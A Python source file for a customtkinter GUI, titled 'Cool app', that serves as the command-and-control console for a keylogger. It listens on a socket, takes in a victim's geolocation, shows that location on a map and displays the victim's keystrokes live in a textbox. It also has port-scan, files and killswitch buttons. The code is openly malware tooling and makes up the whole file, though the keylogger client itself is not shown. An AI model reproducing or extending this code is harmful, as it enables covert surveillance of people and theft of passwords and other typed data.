import customtkinter
import tkinter
from pynput.keyboard import Listener
import threading
import socket
import tkinter
import tkintermapview
import subprocess

class App(customtkinter.CTk):
    SERVER_SOCKETS= [] 
    USER_GEOLOCATIONS= []


    def __init__(self):
        super().__init__()
               
        self.title("Cool app")
        self.geometry("1000x500")

        # create 2x2 grid system
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure((0, 3), weight=1)

  
        ############################################################################################
        #                                        UI design                                         #
        ############################################################################################
        #! Right Frame: Live Keylogger update
        self.frame = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=600)
        self.frame.grid(row=0, column=3, sticky="ne")

         # Text Box 
        self.textbox = customtkinter.CTkTextbox(master=self.frame, width=200, height=500)
        self.textbox.grid(row=0, column=2,sticky="nsew")
        
        # create CTk scrollbar
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self.frame,width=17, height=500, command=self.textbox.yview)
        self.ctk_textbox_scrollbar.grid(row=0, column=3,sticky="nw")
        
        # connect textbox scroll event to CTk scrollbar
        self.textbox.configure(yscrollcommand=self.ctk_textbox_scrollbar.set)
        
        
        #! Left Frame: Navigation Buttons
        self.frame1 = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=500)
        self.frame1.grid(row=0, column=0, sticky="w")
        
        # Buttons
        self.button = customtkinter.CTkButton(master=self.frame1, text="Killswitch", command=lambda: self.killswitch(self.SERVER_SOCKETS[0]))
        self.button.grid(row=0, column=0, pady =10,sticky="n")
      
        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startScan, text="Port Scan")
        self.button.grid(row=1, column=0, pady =10,sticky="n")

        self.button = customtkinter.CTkButton(master=self.frame1, command=self.openMapLevel,text="Geolocation")
        self.button.grid(row=2, column=0, pady =10,sticky="n")     

        self.button = customtkinter.CTkButton(master=self.frame1, command=self.showFiles,text="Files")
        self.button.grid(row=3, column=0, pady =10, sticky="n")
        
        
        ############################################################################################
        #                                        System                                            #
        ###########################################################################################

        #? Socket Functions
        def startSocket():
            t2 = threading.Thread(target=createKeylogSocket)
            t2.daemon = True
            t2.start()

        def createKeylogSocket():
            HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
            PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                print("Listening for clients.")
                s.listen()
                conn, addr = s.accept()
                with conn:
                    print(f"Connected by {addr}")
                    # Recieve geo data before key logging
                    self.USER_GEOLOCATIONS.append(conn.recv(128).decode("utf-8"))
                    self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                    while True:
                        data = conn.recv(1024).decode("utf-8") 
                        self.textbox.insert("0.0", f"{data[1:-1]}\n") 
                        print(data)
        startSocket()
    
    def showFiles(self):
        subprocess.Popen('explorer "Data"')     
    
    def killswitch(self, sock):
        try:
            sock.shutdown(socket.SHUT_RDWR)
            sock.close()
            print("Succsesfully shutdown all connections.")
        except:
            print("Error: Socket shutdown. Prob no sockets to close.")
    
    def openScanner(self):
        import portscaner
        print(str(self.SERVER_SOCKETS))
        portscaner.scan_ports("127.0.0.1", 70)
        

    def startScan(self):
        portThread = threading.Thread(target=self.openScanner)
        portThread.daemon = True
        portThread.start()
    
    def openMapLevel(self):
        # create tkinter window
        def create_geoTopLevel():
            root_tk = customtkinter.CTkToplevel(self)
            root_tk.geometry("800x600")
            root_tk.title("Location mapping.")

            # create map widget
            map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
            map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            try:
                map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
            except:
                map_widget.set_address("colosseo, rome, italy")

        geoThread = threading.Thread(target=create_geoTopLevel)
        geoThread.daemon = True
        geoThread.start()
        
    

app = App()
app.mainloop()
